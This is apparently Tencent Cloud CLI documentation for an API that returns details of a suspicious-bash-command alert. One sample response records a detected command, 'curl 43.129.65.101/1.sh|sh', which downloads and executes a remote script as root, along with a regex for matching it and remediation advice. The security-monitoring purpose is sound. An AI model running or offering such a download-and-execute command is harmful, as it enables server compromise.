**Example 1: 示例**



Input: 

```
tccli cwp DescribeBashEventsInfoNew --cli-unfold-argument  \
    --Id 12
```

Output: 
```
{
    "Response": {
        "BashEventsInfo": {
            "Uuid": "xx",
            "RegexBashCmd": "xx",
            "Platform": 1,
            "Id": 1,
            "Status": 1,
            "MachineWanIp": "xx",
            "Tags": [
                "xx"
            ],
            "MachineName": "xx",
            "RuleLevel": 1,
            "SuggestScheme": "xx",
            "Exe": "xx",
            "HostIp": "xx",
            "ModifyTime": "xx",
            "BashCmd": "xx",
            "RuleCategory": 1,
            "RuleId": 1,
            "HarmDescribe": "xx",
            "References": [
                "xx"
            ],
            "Quuid": "xx",
            "RuleName": "xx",
            "MachineStatus": "xx",
            "CreateTime": "xx",
            "PsTree": "xx"
        },
        "RequestId": "f14ce73f-50d7-4c36-af1d-fc33dae510c4"
    }
}
```

**Example 2: 示例1**



Input: 

```
tccli cwp DescribeBashEventsInfoNew --cli-unfold-argument  \
    --Id 3170751
```

Output: 
```
{
    "Response": {
        "BashEventsInfo": {
            "Uuid": "7168bc08-c1b8-11ea-9053-48fd8e5f474c",
            "Id": 3170751,
            "Quuid": "d8feb20e-dcdd-461b-9b37-336c42d48657",
            "HostIp": "172.16.0.49",
            "Platform": 4,
            "BashCmd": "/bin/sh -c curl 43.129.65.101/1.sh|sh",
            "RuleId": 0,
            "RuleName": "1003.恶意命令-下载&执行未知程序",
            "RuleLevel": 1,
            "Status": 0,
            "CreateTime": "2022-09-19 19:45:05",
            "Exe": "/usr/bin/bash",
            "ModifyTime": "2022-09-19 19:45:05",
            "PsTree": "W3sicGlkIjoyOTQ0NiwiZXhlIjoiL3Vzci9iaW4vYmFzaCIsImFjY291bnQiOiJyb290OnJvb3QiLCJjbWRsaW5lIjoiL2Jpbi9zaCAtYyBjdXJsIDQzLjEyOS42NS4xMDEvMS5zaHxzaCJ9LHsicGlkIjoyOTQ0NCwiZXhlIjoiL3Vzci9zYmluL2Nyb25kIiwiYWNjb3VudCI6InJvb3Q6cm9vdCIsImNtZGxpbmUiOiIvdXNyL3NiaW4vQ1JPTkQgLW4ifSx7InBpZCI6MTM5OSwiZXhlIjoiL3Vzci9zYmluL2Nyb25kIiwiYWNjb3VudCI6InJvb3Q6cm9vdCIsImNtZGxpbmUiOiIvdXNyL3NiaW4vY3JvbmQgLW4ifV0=",
            "User": "0:0",
            "Pid": "29446",
            "RegexBashCmd": "/bin/sh -c curl 43\\.129\\.65\\.101/1\\.sh\\|sh",
            "RuleCategory": 0,
            "MachineName": "功能测试软件较多_ivon",
            "SuggestScheme": "1.检查恶意进程及非法端口，删除可疑的启动项和定时任务；\n2.隔离或者删除相关的木马文件；\n3.对系统进行风险排查，并进行安全加固，详情可参考如下链接： \n【Linux】https://cloud.tencent.com/document/product/296/9604 \n【Windows】https://cloud.tencent.com/document/product/296/9605",
            "HarmDescribe": "黑客在入侵服务器后，为了进行下一步的恶意操作，会执行恶意文件下载、连接矿池、添加公钥、查看敏感文件等操作。",
            "Tags": [],
            "References": [],
            "MachineWanIp": "42.194.146.17",
            "MachineStatus": "ONLINE",
            "MachineType": 2,
            "DetectBy": 1
        },
        "RequestId": "0a9b5442-cd56-4b47-86c7-0f9f22d9fc7e"
    }
}
```

